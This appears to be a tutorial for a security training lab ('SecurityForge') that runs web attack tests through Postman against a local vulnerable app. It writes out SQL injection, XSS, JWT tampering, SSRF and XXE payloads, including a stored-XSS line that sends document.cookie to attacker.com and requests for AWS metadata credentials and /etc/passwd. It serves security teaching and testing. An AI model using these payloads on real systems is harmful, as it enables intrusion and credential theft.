# SecurityForge - Postman Integration Guide (Complete)

## 📌 TABLE OF CONTENTS

1. [Installation & Setup](#installation--setup)
2. [Environment Configuration](#environment-configuration)
3. [SQLi Testing](#sqli-testing-sql-injection)
4. [XSS Testing](#xss-testing-cross-site-scripting)
5. [BOLA Testing](#bola-testing-broken-object-level-authorization)
6. [Authentication Bypass](#authentication-bypass-testing)
7. [SSRF Testing](#ssrf-testing-server-side-request-forgery)
8. [XXE Testing](#xxe-testing-xml-external-entity)
9. [Deserialization Testing](#deserialization-testing)
10. [Automation with Newman](#automation-with-newman)
11. [Advanced Features](#advanced-features-pre-request-scripts)
12. [Collection Export & Sharing](#collection-export--sharing)

---

## 🔧 INSTALLATION & SETUP

### **Step 1: Download Postman**
```
Windows/Mac/Linux:
1. Visit: https://www.postman.com/downloads/
2. Download Postman (or use web version)
3. Install and create account
4. Launch Postman
```

### **Step 2: Import SecurityForge Collection**
```
Method 1: Direct File Import
1. Postman → File → Import
2. Select: SecurityForge_Postman_Collection.json
3. Collection appears in sidebar

Method 2: Link Import
1. Postman → File → Import
2. Paste URL: https://raw.githubusercontent.com/yourusername/securityforge/main/postman/SecurityForge_Collection.json
3. Collection imported automatically
```

### **Step 3: Import Environment**
```
1. Postman → Environments (left sidebar)
2. Click "Import"
3. Select: SecurityForge_Environment.json
4. Click "Manage Environments"
5. Edit environment:
   - {{target_url}}: http://localhost:5000 (or your domain)
   - {{auth_token}}: (leave blank initially)
```

---

## 🌍 ENVIRONMENT CONFIGURATION

### **SecurityForge_Environment.json Template**

```json
{
  "name": "SecurityForge - Local",
  "values": [
    {
      "key": "target_url",
      "value": "http://localhost:5000",
      "type": "default",
      "enabled": true
    },
    {
      "key": "api_key",
      "value": "",
      "type": "secret",
      "enabled": true
    },
    {
      "key": "auth_token",
      "value": "",
      "type": "secret",
      "enabled": true
    },
    {
      "key": "username",
      "value": "student@securityforge.com",
      "type": "default",
      "enabled": true
    },
    {
      "key": "password",
      "value": "StudentPassword123",
      "type": "secret",
      "enabled": true
    },
    {
      "key": "admin_username",
      "value": "admin@securityforge.com",
      "type": "default",
      "enabled": true
    },
    {
      "key": "admin_password",
      "value": "AdminPassword123",
      "type": "secret",
      "enabled": true
    },
    {
      "key": "user_id",
      "value": "1",
      "type": "default",
      "enabled": true
    },
    {
      "key": "admin_id",
      "value": "2",
      "type": "default",
      "enabled": true
    },
    {
      "key": "response_time",
      "value": "",
      "type": "default",
      "enabled": true
    }
  ]
}
```

---

## 🔓 SQLI TESTING (SQL INJECTION)

### **Step 1: Basic SQLi Test - GET Parameter**

**Request Setup:**
```
Method: GET
URL: {{target_url}}/api/search?product_name=Admin' OR '1'='1
Headers:
  Content-Type: application/json
  Authorization: Bearer {{auth_token}}
```

**Expected Vulnerable Response:**
```json
{
  "status": 200,
  "data": [
    {
      "product_id": 1,
      "name": "Laptop",
      "price": 1200,
      "description": "..."
    },
    {
      "product_id": 2,
      "name": "Phone",
      "price": 800
    }
  ]
}
```

**Tests Tab (Copy-Paste):**
```javascript
// Check if response contains multiple products (sign of SQLi)
pm.test("SQLi Vulnerability: Retrieved Multiple Products", function () {
    var jsonData = pm.response.json();
    pm.expect(jsonData.data.length).to.be.greaterThan(1);
});

// Check if query was unfiltered
pm.test("SQLi Success: No Input Validation", function () {
    var jsonData = pm.response.json();
    pm.expect(pm.response.code).to.equal(200);
});

// Alert if vulnerable
if (pm.response.code === 200) {
    console.log("⚠️ VULNERABLE: SQL Injection detected in search parameter");
}
```

---

### **Step 2: Time-Based Blind SQLi**

**Request:**
```
Method: GET
URL: {{target_url}}/api/products?id=1' AND SLEEP(5) --
Headers:
  Authorization: Bearer {{auth_token}}
```

**Test Script:**
```javascript
// Measure response time
pm.test("Time-Based SQLi: Response delay detected (VULNERABLE)", function () {
    // Should take ~5+ seconds if vulnerable
    pm.expect(pm.response.responseTime).to.be.greaterThan(4500);
});

// Store response time for analysis
pm.environment.set("response_time", pm.response.responseTime);

console.log("Response time: " + pm.response.responseTime + "ms");
```

---

### **Step 3: UNION-Based SQLi**

**Request:**
```
Method: GET
URL: {{target_url}}/api/products?id=1' UNION SELECT database(), user(), version() --
Headers:
  Authorization: Bearer {{auth_token}}
```

**Test:**
```javascript
pm.test("UNION SQLi: Database information disclosed", function () {
    var jsonData = pm.response.json();
    // Should return database info if vulnerable
    pm.expect(JSON.stringify(jsonData)).to.include("database");
});
```

---

### **Step 4: POST Body SQLi (JSON)**

**Request:**
```
Method: POST
URL: {{target_url}}/api/login
Headers:
  Content-Type: application/json

Body (Raw):
{
  "username": "admin' OR '1'='1",
  "password": "anything"
}
```

**Test:**
```javascript
pm.test("POST SQLi: Bypassed authentication", function () {
    var jsonData = pm.response.json();
    // If vulnerable, will return valid auth token
    pm.expect(jsonData.token).to.exist;
});

// Save token if bypass successful
if (pm.response.json().token) {
    pm.environment.set("auth_token", pm.response.json().token);
}
```

---

## 🔓 XSS TESTING (CROSS-SITE SCRIPTING)

### **Step 1: Reflected XSS - GET Parameter**

**Request:**
```
Method: GET
URL: {{target_url}}/api/search?q=<script>alert('XSS')</script>
Headers:
  Authorization: Bearer {{auth_token}}
```

**Test:**
```javascript
pm.test("Reflected XSS: Script tag in response (VULNERABLE)", function () {
    pm.expect(pm.response.text()).to.include("<script>alert('XSS')</script>");
});

pm.test("No HTML encoding detected", function () {
    var response = pm.response.text();
    // Check if < > are NOT encoded
    pm.expect(response).to.include("<script>");
    pm.expect(response).not.to.include("&lt;script&gt;");
});
```

---

### **Step 2: DOM-Based XSS**

**Request:**
```
Method: GET
URL: {{target_url}}/dashboard?user=<img src=x onerror=alert('XSS')>
Headers:
  Authorization: Bearer {{auth_token}}
```

**Test:**
```javascript
pm.test("DOM XSS: onerror handler reflected", function () {
    pm.expect(pm.response.text()).to.include("onerror=");
});
```

---

### **Step 3: Stored XSS - Create & Retrieve**

**Request 1: Store XSS**
```
Method: POST
URL: {{target_url}}/api/comments
Headers:
  Content-Type: application/json
  Authorization: Bearer {{auth_token}}

Body:
{
  "comment": "<img src=x onerror=\"fetch('http://attacker.com/steal?data='+document.cookie)\">"
}
```

**Request 2: Retrieve & Verify**
```
Method: GET
URL: {{target_url}}/api/comments
Headers:
  Authorization: Bearer {{auth_token}}
```

**Test:**
```javascript
pm.test("Stored XSS: Malicious payload persisted in database", function () {
    var jsonData = pm.response.json();
    pm.expect(JSON.stringify(jsonData)).to.include("onerror=");
});
```

---

## 🔓 BOLA TESTING (BROKEN OBJECT LEVEL AUTHORIZATION)

### **Step 1: Authentication Setup**

**Request 1: Login as User 1**
```
Method: POST
URL: {{target_url}}/api/auth/login
Headers:
  Content-Type: application/json

Body:
{
  "username": "user1@securityforge.com",
  "password": "UserPassword123"
}
```

**Test & Save Token:**
```javascript
pm.test("Status code is 200", function () {
    pm.expect(pm.response.code).to.equal(200);
});

// Save token for next requests
var jsonData = pm.response.json();
pm.environment.set("user1_token", jsonData.access_token);
pm.environment.set("user1_id", jsonData.user_id);
```

---

### **Step 2: Access Own Resource (Expected)**

**Request:**
```
Method: GET
URL: {{target_url}}/api/users/{{user1_id}}/orders
Headers:
  Authorization: Bearer {{user1_token}}
```

**Test:**
```javascript
pm.test("Access own resource: 200 OK", function () {
    pm.expect(pm.response.code).to.equal(200);
});

pm.test("Data belongs to authenticated user", function () {
    var jsonData = pm.response.json();
    pm.expect(jsonData.user_id).to.equal(parseInt(pm.environment.get("user1_id")));
});
```

---

### **Step 3: Attempt Unauthorized Access (BOLA)**

**Login as User 2 First:**
```
Method: POST
URL: {{target_url}}/api/auth/login

Body:
{
  "username": "user2@securityforge.com",
  "password": "UserPassword123"
}
```

**Save Token:**
```javascript
var jsonData = pm.response.json();
pm.environment.set("user2_token", jsonData.access_token);
pm.environment.set("user2_id", jsonData.user_id);
```

**Request: Access User 1's Orders as User 2**
```
Method: GET
URL: {{target_url}}/api/users/{{user1_id}}/orders
Headers:
  Authorization: Bearer {{user2_token}}
```

**Test for BOLA Vulnerability:**
```javascript
pm.test("BOLA Vulnerability: Unauthorized access to other user's orders", function () {
    // Vulnerable: Returns 200 + data
    // Secure: Returns 403 Forbidden
    if (pm.response.code === 200) {
        console.log("🔴 VULNERABLE: User 2 accessed User 1's data!");
        pm.expect(pm.response.code).to.equal(200); // Confirmvuln
    } else if (pm.response.code === 403) {
        console.log("✅ SECURE: Properly denied access");
    }
});

// Confirm we got unauthorized access
var jsonData = pm.response.json();
pm.test("Retrieved other user's order data", function () {
    pm.expect(jsonData.user_id).to.equal(parseInt(pm.environment.get("user1_id")));
});
```

---

### **Step 4: BOLA on Sensitive Resources**

**Request: Access Admin Panel as Regular User**
```
Method: GET
URL: {{target_url}}/api/users/{{admin_id}}/sensitive-data
Headers:
  Authorization: Bearer {{user1_token}}
```

**Test:**
```javascript
pm.test("BOLA on Admin Resources: Accessed admin data as regular user", function () {
    pm.expect(pm.response.code).to.equal(200);
    var jsonData = pm.response.json();
    pm.expect(jsonData.role).to.equal("admin");
});
```

---

## 🔓 AUTHENTICATION BYPASS TESTING

### **Step 1: JWT Token Tampering**

**Request: Get Valid Token**
```
Method: POST
URL: {{target_url}}/api/auth/login
Body:
{
  "username": "user1@securityforge.com",
  "password": "UserPassword123"
}
```

**Modify Token (Pre-request Script):**
```javascript
// Get original token
var token = pm.environment.get("auth_token");

// Decode JWT (only first 2 parts, last part is signature)
var parts = token.split('.');
var payload = JSON.parse(atob(parts[1]));

// Modify payload (change user_id to admin)
payload.user_id = 999;  // Admin ID
payload.role = "admin";

// Re-encode (NOTE: Real servers validate signature, this is for demo)
// In real scenario, you'd need to forge the signature
var newPayload = btoa(JSON.stringify(payload));
var tamperedToken = parts[0] + '.' + newPayload + '.' + parts[2];

pm.environment.set("tampered_token", tamperedToken);
```

**Request with Tampered Token:**
```
Method: GET
URL: {{target_url}}/api/admin/users
Headers:
  Authorization: Bearer {{tampered_token}}
```

**Test:**
```javascript
pm.test("JWT Forgery: Accessed admin endpoint with modified token", function () {
    if (pm.response.code === 200) {
        console.log("🔴 VULNERABLE: JWT validation bypassed!");
    }
    pm.expect(pm.response.code).to.equal(200);
});
```

---

### **Step 2: Default Credentials**

**Request:**
```
Method: POST
URL: {{target_url}}/api/auth/login

Body:
{
  "username": "admin",
  "password": "admin"
}
```

**Test:**
```javascript
pm.test("Default Credentials: Admin access with default password", function () {
    var jsonData = pm.response.json();
    if (jsonData.access_token) {
        console.log("🔴 VULNERABLE: Default credentials work!");
        pm.environment.set("admin_token", jsonData.access_token);
    }
});
```

---

## 🔓 SSRF TESTING (SERVER-SIDE REQUEST FORGERY)

### **Step 1: Test SSRF Vulnerability**

**Request 1: Normal Request**
```
Method: POST
URL: {{target_url}}/api/fetch-resource
Headers:
  Content-Type: application/json
  Authorization: Bearer {{auth_token}}

Body:
{
  "url": "https://www.google.com"
}
```

**Step 2: Attempt Internal Service Access**

**Request:**
```
Method: POST
URL: {{target_url}}/api/fetch-resource

Body:
{
  "url": "http://127.0.0.1:5000/api/admin/users"
}
```

**Test for SSRF:**
```javascript
pm.test("SSRF Vulnerability: Accessed internal service", function () {
    var response = pm.response.text();
    
    if (response.includes("admin") || pm.response.code === 200) {
        console.log("🔴 VULNERABLE: SSRF allows internal service access!");
    }
    
    pm.expect(response).to.include("admin");
});
```

---

### **Step 3: SSRF to AWS Metadata**

**Request:**
```
Method: POST
URL: {{target_url}}/api/fetch-resource

Body:
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

**Test:**
```javascript
pm.test("SSRF to AWS Metadata: Retrieved credentials", function () {
    var response = pm.response.text();
    
    if (response.includes("AccessKeyId")) {
        console.log("🔴 CRITICAL: AWS credentials exposed via SSRF!");
        pm.expect(response).to.include("AccessKeyId");
    }
});
```

---

## 🔓 XXE TESTING (XML EXTERNAL ENTITY)

### **Step 1: Basic XXE - File Disclosure**

**Request:**
```
Method: POST
URL: {{target_url}}/api/parse-xml
Headers:
  Content-Type: application/xml
  Authorization: Bearer {{auth_token}}

Body:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>
```

**Test:**
```javascript
pm.test("XXE Vulnerability: /etc/passwd disclosed", function () {
    pm.expect(pm.response.text()).to.include("root:");
});
```

---

### **Step 2: XXE -> SSRF**

**Request:**
```
Method: POST
URL: {{target_url}}/api/parse-xml

Body:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

**Test:**
```javascript
pm.test("XXE to SSRF: Internal metadata accessed", function () {
    pm.expect(pm.response.text()).to.include("meta-data");
});
```

---

## 🔓 DESERIALIZATION TESTING

### **Step 1: Java Deserialization RCE**

**Request:**
```
Method: POST
URL: {{target_url}}/api/process-data
Headers:
  Content-Type: application/octet-stream
  Authorization: Bearer {{auth_token}}

Body: (Binary serialized Java object with ysoserial gadget chain)
```

---

## 🤖 AUTOMATION WITH NEWMAN

### **Install Newman**

```bash
# Install globally
npm install -g newman

# Or use npx (no installation needed)
npx newman
```

---

### **Run Collection via CLI**

```bash
# Basic run
newman run SecurityForge_Collection.json \
  --environment SecurityForge_Environment.json

# With custom target
newman run SecurityForge_Collection.json \
  --environment SecurityForge_Environment.json \
  -e target_url=https://production.example.com

# Generate HTML report
newman run SecurityForge_Collection.json \
  --environment SecurityForge_Environment.json \
  --reporters cli,html \
  --reporter-html-export report.html
```

---

### **Scheduled Runs (CI/CD Integration)**

**GitHub Actions Example:**
```yaml
name: SecurityForge Regression Tests

on:
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM

jobs:
  postman-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run Postman Tests
        run: |
          npm install -g newman
          newman run postman/SecurityForge_Collection.json \
            --environment postman/SecurityForge_Environment.json \
            --reporters cli,html \
            --reporter-html-export report.html
      
      - name: Upload Report
        uses: actions/upload-artifact@v2
        with:
          name: postman-report
          path: report.html
```

---

## 🎯 ADVANCED FEATURES: PRE-REQUEST SCRIPTS

### **Auto-Authentication Script**

Add this to PRE-REQUEST SCRIPTS tab of parent folder:

```javascript
// Check if token exists and is fresh
var token = pm.environment.get("auth_token");
var tokenTimestamp = pm.environment.get("auth_token_timestamp");

var needsRefresh = !token || 
    (new Date() - new Date(tokenTimestamp)) > 3600000; // 1 hour

if (needsRefresh) {
    // Login request
    var loginRequest = {
        url: pm.environment.get("target_url") + '/api/auth/login',
        method: 'POST',
        header: {
            'Content-Type': 'application/json'
        },
        body: {
            mode: 'raw',
            raw: JSON.stringify({
                username: pm.environment.get("username"),
                password: pm.environment.get("password")
            })
        }
    };
    
    pm.sendRequest(loginRequest, function(err, response) {
        if (!err) {
            var jsonResponse = response.json();
            pm.environment.set("auth_token", jsonResponse.access_token);
            pm.environment.set("auth_token_timestamp", new Date());
            console.log("✅ Token refreshed");
        }
    });
}
```

---

### **Response Data Extraction**

Add to TESTS tab:

```javascript
// Extract data for next request
var jsonData = pm.response.json();

if (jsonData.user_id) {
    pm.environment.set("last_user_id", jsonData.user_id);
}

if (jsonData.order_id) {
    pm.environment.set("last_order_id", jsonData.order_id);
}

if (jsonData.session_id) {
    pm.environment.set("session_id", jsonData.session_id);
}

console.log("Variables set from response");
```

---

## 📤 COLLECTION EXPORT & SHARING

### **Export Collection**

```
1. Click collection → Click three dots (•••)
2. Click "Export"
3. Select format: "Collection v2.1"
4. Save as: SecurityForge_Collection.json
```

### **Share Collection Link**

```
1. Click collection → Click share icon
2. "Generate public link"
3. Copy link
4. Share with team
5. Others can import via link
```

---

## 📋 TESTING CHECKLIST

- [ ] Authentication tests (login, token generation)
- [ ] SQLi in GET parameters
- [ ] SQLi in POST body
- [ ] Time-based blind SQLi
- [ ] UNION-based SQLi
- [ ] XSS in URL parameters
- [ ] XSS in POST body
- [ ] Stored XSS via comments
- [ ] BOLA on user profiles
- [ ] BOLA on orders
- [ ] BOLA on admin resources
- [ ] JWT tampering
- [ ] Default credentials
- [ ] SSRF to internal services
- [ ] SSRF to AWS metadata
- [ ] XXE file disclosure
- [ ] XXE to SSRF
- [ ] Deserialization RCE
- [ ] Rate limiting bypass
- [ ] Cookie manipulation

---

**Next: → See BURP_SUITE_GUIDE.md for browser-based testing**

